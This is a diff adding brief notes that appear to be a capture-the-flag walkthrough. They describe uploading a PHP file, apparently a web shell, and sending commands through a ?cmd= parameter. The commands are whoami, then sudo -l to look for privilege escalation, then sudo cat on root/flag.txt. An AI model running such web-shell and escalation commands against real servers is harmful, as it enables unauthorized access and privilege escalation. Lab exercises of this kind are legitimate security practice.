@@ -1,0 +1,9 @@
+#########processs#################
+1.start by uploading the php file 
+run ?cmd=whoami
+
+#########step2.##################
+run ?cmd=sudo -l to check if you can escalate privilages if so then run
+
+###########step3.################
+run ?cmd= sudo cat root/flag.txt
